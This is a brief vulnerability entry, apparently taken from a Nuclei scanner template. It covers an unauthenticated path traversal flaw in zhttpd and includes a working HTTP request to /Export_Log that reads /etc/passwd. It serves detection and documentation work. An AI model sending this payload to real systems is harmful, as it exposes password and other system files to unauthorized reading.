# Vulnerability: zhttpd - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`unauth-lfd-zhttpd.yaml`)

## Description
zhttpd is vulnerable to unauthenticated local inclusion including privileged files such as /etc/shadow. An attacker can read all files on the system by using this endpoint.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /Export_Log?/etc/passwd HTTP/1.1
Host: {{Hostname}}
Accept: */*
```

